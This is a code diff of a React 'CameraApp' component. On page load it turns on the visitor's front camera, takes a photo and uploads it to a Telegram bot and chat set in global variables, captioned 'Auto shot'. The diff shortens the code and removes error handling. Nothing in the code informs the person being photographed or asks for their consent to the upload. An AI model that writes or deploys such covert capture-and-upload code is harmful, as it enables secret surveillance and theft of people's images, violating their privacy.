@@ -1,81 +1,41 @@
 function CameraApp() {
   const [photoDataUrl, setPhotoDataUrl] = React.useState(null);
-  const isActiveRef = React.useRef(false);
-  const hasShotRef = React.useRef(false);
 
   const takeAndSendPhoto = async () => {
-    if (!isActiveRef.current || hasShotRef.current) return;
-    hasShotRef.current = true;
     let stream;
     try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false,
-      });
-
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
       const video = document.createElement("video");
-      video.playsInline = true;
       video.srcObject = stream;
-
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          video.play();
-          resolve();
-        };
-      });
+      await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });
 
       const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // Показать фото на странице
-      const dataUrl = canvas.toDataURL("image/png");
-      if (isActiveRef.current) setPhotoDataUrl(dataUrl);
+      setPhotoDataUrl(canvas.toDataURL("image/png"));
 
-      const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png"));
-      if (!blob) return;
-
-      if (window.sendPhotoToTelegram && window.TELEGRAM_BOT_TOKEN && window.TELEGRAM_CHAT_ID) {
+      const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
+      if (blob && window.sendPhotoToTelegram) {
         await window.sendPhotoToTelegram({
           botToken: window.TELEGRAM_BOT_TOKEN,
           chatId: window.TELEGRAM_CHAT_ID,
           photoBlob: blob,
-          caption: "Auto shot",
+          caption: "Auto shot"
         });
       }
-    } catch (e) {
-      // глушим ошибки — ничего не выводим
-      console.error(e);
     } finally {
-      if (stream) {
-        stream.getTracks().forEach((t) => t.stop());
-      }
+      if (stream) stream.getTracks().forEach(t => t.stop());
     }
   };
 
   React.useEffect(() => {
-    isActiveRef.current = true;
-    const rafId = requestAnimationFrame(() => {
-      void takeAndSendPhoto();
-    });
-    return () => {
-      isActiveRef.current = false;
-      cancelAnimationFrame(rafId);
-    };
+    takeAndSendPhoto();
   }, []);
 
-  return (
-    <div>
-      {photoDataUrl && (
-        <img src={photoDataUrl} alt="Снимок" style={{ width: "100%", height: "auto", display: "block" }} />
-      )}
-    </div>
-  );
+  return photoDataUrl && <img src={photoDataUrl} alt="Снимок" style={{ width: "100%" }} />;
 }
 
 const root = ReactDOM.createRoot(document.getElementById("root"));
 root.render(<CameraApp />);
-
-
